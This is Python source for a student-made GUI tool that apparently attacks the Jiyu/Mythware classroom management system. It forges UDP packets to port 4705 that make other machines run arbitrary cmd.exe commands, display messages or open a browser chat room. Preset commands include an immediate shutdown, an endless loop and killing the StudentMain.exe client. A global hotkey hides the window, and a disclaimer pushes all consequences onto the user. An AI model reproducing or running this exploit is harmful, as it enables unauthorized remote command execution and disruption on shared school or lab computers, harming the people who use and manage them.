#coding:utf-8
import binascii
import socket
import time
import keyboard
import os
from simple_widgets import *
from simple_window import *
from tkinter import *
from tkinter.messagebox import *
from tkinter.filedialog import *
from tkinter.scrolledtext import ScrolledText
from tkinter import ttk
from PIL import Image,ImageTk, ImageSequence

class V(object):
    def __init__(self):
        self.open_help = 1
        self.open_cchat = 1
        self.explorer = r'C:\Users\Administrator\AppData\Local\Google\Chrome\Application\chrome.exe'
        self.chat = ''
v = V()

def st_red(event):
    root_window.button_list[root_window.button_text.index('⊕')]['bg'] = '#4c8dca'

def st_green(event):
    root_window.button_list[root_window.button_text.index('⊕')]['bg'] = '#66CDAA'

num=0
def zxml(*event):
    #C:\Windows\System32
    global num
    ml="C:\\WINDOWS\\system32\\cmd.exe"
    cs="/c "
    cs+=mlcombobox.get()
    print(ml)
    print (cs)
    if ml=="":
        result=showinfo("错误","没有命令")
        return
    
    try:
        iplist.get(iplist.curselection())
    except:
        result=showinfo("错误","没有指定ip")
        return
    payload= b"\x44\x4d\x4f\x43\x00\x00\x01\x00\x6e\x03\x00\x00"
    payload+=num.to_bytes(1,byteorder='little', signed=False)
    num+=1;
    if num==99:
        num=0
    payload+=b"\xca\x6c\x1a\xee\x10\x8e\x41\x9f\x49\x72\xf3\x6d\x10\x9c\x69\x20\x4e\x00\x00\xc0\xa8\x03\xfe\x61\x03\x00\x00\x61\x03\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00"
    
    aaa=""
    bbb=""
    
    for i in ml:
        aaa += hex(ord(i))[2:]+"00"
    for i in cs:
        bbb += hex(ord(i))[2:]+"00"
    send=binascii.unhexlify(aaa)
    cs=binascii.unhexlify(bbb)
        
    payload+=send
    payload+=b"\x00"*(512-len(send))
    payload+=cs
    payload+=b"\x00"*(324-len(cs))
    payload+=b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    ip=iplist.get(iplist.curselection())
    port=4705
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.sendto(payload,(ip,port))

def zxml2(*event):
    #C:\Windows\System32
    global num
    ml="C:\\WINDOWS\\system32\\cmd.exe"
    cs="/c "
    
    
    cs+=mltext.get(1.0, "end").replace('\n', '&')
    print(ml)
    print (cs)
    if ml=="":
        result=showinfo("错误","没有命令")
        return
    
    try:
        iplist.get(iplist.curselection())
    except:
        result=showinfo("错误","没有指定ip")
        return
    payload= b"\x44\x4d\x4f\x43\x00\x00\x01\x00\x6e\x03\x00\x00"
    payload+=num.to_bytes(1,byteorder='little', signed=False)
    num+=1;
    if num==99:
        num=0
    payload+=b"\xca\x6c\x1a\xee\x10\x8e\x41\x9f\x49\x72\xf3\x6d\x10\x9c\x69\x20\x4e\x00\x00\xc0\xa8\x03\xfe\x61\x03\x00\x00\x61\x03\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00"

    aaa=""
    bbb=""
    
    for i in ml:
        aaa += hex(ord(i))[2:]+"00"
    for i in cs:
        bbb += hex(ord(i))[2:]+"00"
    send=binascii.unhexlify(aaa)
    cs=binascii.unhexlify(bbb)
        
    payload+=send
    payload+=b"\x00"*(512-len(send))
    payload+=cs
    payload+=b"\x00"*(324-len(cs))
    payload+=b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    ip=iplist.get(iplist.curselection())
    port=4705
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.sendto(payload,(ip,port))

def fsxx(*event):
    global num
    try:
        iplist.get(iplist.curselection())
    except:
        result=showinfo("错误","没有指定ip")
        return
    
    payload= b"\x44\x4d\x4f\x43\x00\x00\x01\x00\x9e\x03\x00\x00\x7c"
    payload+=num.to_bytes(1,byteorder='little', signed=False)
    num+=1;
    if num==99:
        num=0
    payload+=b"\x6b\xf7\x79\x0c\xdd\x46\x9d\x87\x4b\x4d\x79\xbc\x2b\x8d\x20\x4e\x00\x00\xc0\xa8\xab\x83\x91\x03\x00\x00\x91\x03\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00"


    ip=iplist.get(iplist.curselection())
    message=""
    message=msgentry.get()
    aaa=""
    for i in message:
        if (i>="a" and i<="z") or (i>="A" and i<="Z"):
            aaa+="00"
        aaa+=hex(ord(i))[2:]
    js=0
    aaa=list(aaa)
    for i in aaa:
        if(js%4==0):
            aaa[js],aaa[js+2]=aaa[js+2],aaa[js]
            aaa[js+1],aaa[js+3]=aaa[js+3],aaa[js+1]
        js+=1
    aaa=''.join(aaa)
    send=binascii.unhexlify(aaa)
    payload+=send
    payload+=b"\x00"*(898-len(send))

    port=4705
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.sendto(payload,(ip,port))

def tjip(*event):
    iplist.insert(END,ipentry.get())
    ipentry.delete(0,END)

def delip(*event):
    iplist.delete(iplist.curselection())

def hide(*event):
    if (v.is_hide == 0):
        v.is_hide = 1
        root_window.withdraw()
        try:
            v.help_ff.destroy(jy=False)
        except:
            pass
        try:
            v.remark.destroy(jy=False)
        except:
            pass
        v.open_help = True
        v.open_cchat = True
        
    else:
        v.is_hide = 0
        root_window.deiconify()

def open_ip(*event):
    file_path = askopenfilename(title='选择文件', filetypes=[
                ('包含ip的文件', '.txt')], initialdir='.')
    if file_path=='':
        return 0
    opf = open(file_path)
    nr = opf.readlines()
    opf.close()
    for i in nr:
        iplist.insert(END, i.replace('\n', ''))

def open_ml(*event):
    file_path = askopenfilename(title='选择文件', filetypes=[
                ('包含常用命令的文件', '.txt')], initialdir='.')
    if file_path=='':
        return 0
    opf = open(file_path)
    nr = opf.readlines()
    opf.close()
    for i in range(len(nr)):
        nr[i] = nr[i].replace('\n', '')
    mlcombobox['value']=nr;

def create_chat(*event):
    def remark_qd():
        ex_nr = re_explorer_e.get()
        ch_nr = re_chat_e.get()
        if (ex_nr=='浏览器路径' or ch_nr=='聊天室名称'):
            v.open_cchat = True
            v.remark.destroy()
            return
        v.open_cchat = True
        v.remark.destroy()
        v.chat = ch_nr
        v.explorer = ex_nr
        os.system("start "+ex_nr+' '+"\"crosst.chat/?\""+ch_nr)

    if (v.open_cchat==False):
        return
    v.open_cchat = False
    RE_SIZ = (350, 210)
    v.remark = OToplevel(top=True, title='选项', button=['×'], tips=['关闭'], abg=['<close-y>'], command=[remark_qd],
                       win_wid=RE_SIZ[0], win_hei=RE_SIZ[1], win_bg_lj=v.image, oimage=False)

    re_explorer_e = PlaholEntry(v.remark, placeholder='浏览器路径', font=('华文楷体', 12), relief='groove')
    re_chat_e = PlaholEntry(v.remark, placeholder='聊天室名称', font=('华文楷体', 12), relief='groove')
    re_explorer_e.insert(0, v.explorer)
    re_chat_e.insert(0, v.chat)
    re_explorer_e.foc_out()
    re_chat_e.foc_out()

    re_explorer_e.place(relx=0.5, y=60, relwidth=0.8, height=20, anchor=N)
    re_chat_e.place(relx=0.5, y=100, relwidth=0.8, height=20, anchor=N)

    re_button = TpButton(v.remark,backpic=v.image, text="确定", command=remark_qd, relief="groove", blur=10, brighter=1.3)
    re_button.place(relwidth=0.8, height=30, relx=0.5, y=RE_SIZ[1]-20, anchor=S)
    v.remark.mainloop()

def add_chat(*event):
    if (v.chat=='' or v.explorer==''):
        showinfo("错误","没有聊天室")
        return
    try:
        iplist.get(iplist.curselection())
    except:
        result=showinfo("错误","没有指定ip")
        return
    ml="C:\\WINDOWS\\system32\\cmd.exe"
    cs="/c "+"start "+v.explorer+' '+"\"crosst.chat/?\""+v.chat
    print(cs)
    payload= b"\x44\x4d\x4f\x43\x00\x00\x01\x00\x6e\x03\x00\x00\x53\xca\x6c\x1a\xee\x10\x8e\x41\x9f\x49\x72\xf3\x6d\x10\x9c\x69\x20\x4e\x00\x00\xc0\xa8\x03\xfe\x61\x03\x00\x00\x61\x03\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00"
    aaa=""
    bbb=""
    
    for i in ml:
        aaa += hex(ord(i))[2:]+"00"
    for i in cs:
        bbb += hex(ord(i))[2:]+"00"
    send=binascii.unhexlify(aaa)
    cs=binascii.unhexlify(bbb)
        
    payload+=send
    payload+=b"\x00"*(512-len(send))
    payload+=cs
    payload+=b"\x00"*(324-len(cs))
    payload+=b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    ip=iplist.get(iplist.curselection())
    port=4705
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.sendto(payload,(ip,port))

def helpw():  # 帮助与简介函数
    if v.open_help:
        v.open_help = False
        def help_ff_close():
            v.help_ff.destroy()
            v.open_help = True

        v.help_ff = OToplevel(top=True, title='简介和用法', button=['×'], tips=['关闭'], abg=['<close-y>'], command=[help_ff_close], win_wid=400,
                            win_hei=400, win_bg_lj=v.image,oimage=False)

        jj = ScrolledText(v.help_ff, relief='sunken', font=('微软雅黑', 14), bg='white')
        jj.insert('insert', '名称：极域反控装置\n作者：dhgz学生\n版本号：2.0（每年暑假更新！）\n------------------------------------------\n'
                  '使用方法：\n1.Ctrl+Q进行隐藏/显示窗口\n2.添加IP后按Enter确认\n2.删除IP选中后按Delete或点击删除按钮\n'
                  '------------------------------------------\n'
                  '注意事项：\n1.每条命令发送期间有约10秒间隔（极域问题）\n2.导入的IP列表文件、常用命令文件均一行一条即可\n3.命令、聊天室名称仅支持英文，发送消息仅支持中文\n'
                  '------------------------------------------\n'
                  '声明：\n使用此程序所造成的一切后果将由使用者本人承担，与作者无关。')
        jj.place(relwidth=0.9, height=300, relx=0.5, y=60, anchor=N)
        jj['state'] = 'disabled'
        v.help_ff.mainloop()

#main
v.image=Image.open(".\\background.jpeg")
v.image=v.image.resize((700,440))
root_window = OTk(title="反控v2.0",win_wid=700,win_hei=440,topbg='#4c8dca',button=['⊕', '×'], tips=['简介', '关闭'], command=[helpw, '<close>'],abg=[(st_green, st_red), '<close-y>'],win_bg_lj=v.image,oimage=False)
root_window.geometry("700x440+"+str(int(root_window.winfo_screenwidth()/2-350))+"+"+str(int(root_window.winfo_screenheight()/2-220)))
root_window.resizable(False,False)
root_window.iconbitmap(".\\icon.ico")
#Label(root_window,image=imagee).place(relwidth=1,relheight=1,x=0,y=0)

#ip
#组播ip：  224.50.50.42
iplabel=Label(root_window,text="添加ip：")
ipentry=Entry()
ipentry.bind("<Return>",tjip)
iplist=Listbox(root_window)
iplist.bind("<KeyPress-Delete>",delip)
delbutton=Button(root_window,text="删除该条",command=delip,relief="groove")
impipbutton=Button(root_window,text="导入ip列表",command=open_ip,relief="groove")

iplist.insert(END,"224.50.50.42")
iplist.insert(END,"10.168.21.28")
Label(root_window,text="--ip列表--").place(relx=0,y=60,relwidth=0.192, height=20)
iplist.place(relx=0,y=80,relwidth=0.192,height=320)
iplabel.place(relx=0,y=40,height=20,relwidth=0.07)
ipentry.place(relx=0.07,y=40,relwidth=0.122,height=20)
impipbutton.place(x=0,y=400,height=20,relwidth=0.192, anchor=NW)
delbutton.place(x=0,rely=1,height=20,relwidth=0.192, anchor=SW)

#执行命令
mlcombobox=ttk.Combobox()
mlcombobox['value']=('shutdown -s -t 0','shutdown -i','echo  >C:\\Users\\Administrator\\Desktop','for /l %a in (0,0,1) do','taskkill -F -IM StudentMain.exe',r'start C:\Users\Administrator\AppData\Local\Google\Chrome\Application\chrome.exe "网址"')
mlcombobox.bind("<Return>",zxml)
mllabel=TpLabel(root_window,backpic=v.image,text="命令：",font=("楷体",15))
mlbutton=TpButton(root_window,backpic=v.image,text="执行命令",command=zxml,relief="groove",blur=10,brighter=1.3)

#发送消息
msgentry=Entry()
msgentry.bind("<Return>",fsxx)
msglabel=TpLabel(root_window,backpic=v.image,text="消息内容:",font=("楷体",15))
msgbutton=TpButton(root_window,backpic=v.image,text="发送消息",command=fsxx,relief="groove",blur=10,brighter=1.3)

#执行命令text
mltext=Text()
mllabel2=TpLabel(root_window,backpic=v.image,text="长命令：",font=("楷体",15))
mlbutton2=TpButton(root_window,backpic=v.image,text="执行命令",command=zxml2,relief="groove",blur=10,brighter=1.3)

mlcombobox.place(x=170,y=100,width=420,height=20)
mllabel.place(x=170,y=70,height=20,relwidth=0.1)
mlbutton.place(x=590,y=100,height=20,relwidth=0.1)

msglabel.place(x=170,y=140,height=20,relwidth=0.15)
msgentry.place(x=170,y=170,relwidth=0.6,height=20)
msgbutton.place(x=590,y=170,height=20,relwidth=0.1)

mltext.place(x=170,y=240,relwidth=0.6,height=70)
mllabel2.place(x=170,y=210,height=20,relwidth=0.12)
mlbutton2.place(x=590,y=240,height=70,relwidth=0.1)

#底部按钮
cltbutton = TpButton(root_window, backpic=v.image, text="创建聊天室", command=create_chat, relief="groove", blur=10, brighter=1.3)
jltbutton = TpButton(root_window, backpic=v.image, text="令其加入聊天室", command=add_chat, relief="groove", blur=10, brighter=1.3)
impmlbutton = TpButton(root_window, backpic=v.image, text="导入常用命令", command=open_ml, relief="groove", blur=10, brighter=1.3)

cltbutton.place(x=170, y=350, width=150, height=40)
jltbutton.place(x=415, y=350, width=150, height=40, anchor=N)
impmlbutton.place(x=660, y=350, width=150, height=40, anchor=NE)

#全局快捷键
v.is_hide = 0
keyboard.add_hotkey('ctrl+q', hide, args=('From global keystroke',))

root_window.mainloop()



